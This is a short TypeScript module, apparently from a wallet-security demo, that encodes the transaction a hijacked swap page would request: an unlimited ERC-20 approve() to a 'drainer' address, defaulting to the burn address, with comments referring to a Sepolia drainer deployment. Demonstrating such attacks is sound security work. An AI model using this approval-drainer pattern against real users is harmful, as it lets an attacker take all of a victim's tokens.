import { encodeFunctionData, maxUint256, parseAbi, type Address } from 'viem';

/** The exact transaction the hijacked DemoSwap asks the wallet to send: approve(drainer, max). */
export const DRAINER: Address = '0x000000000000000000000000000000000000dEaD';
/** approve(drainer, max) on the demo token — the real demo drainer when deployed (sepolia-attack.json). */
export function hijackRequest(token: Address, drainer: Address = DRAINER) {
  return {
    to: token,
    data: encodeFunctionData({ abi: parseAbi(['function approve(address,uint256) returns (bool)']), functionName: 'approve', args: [drainer, maxUint256] }),
    value: '0x0',
  };
}
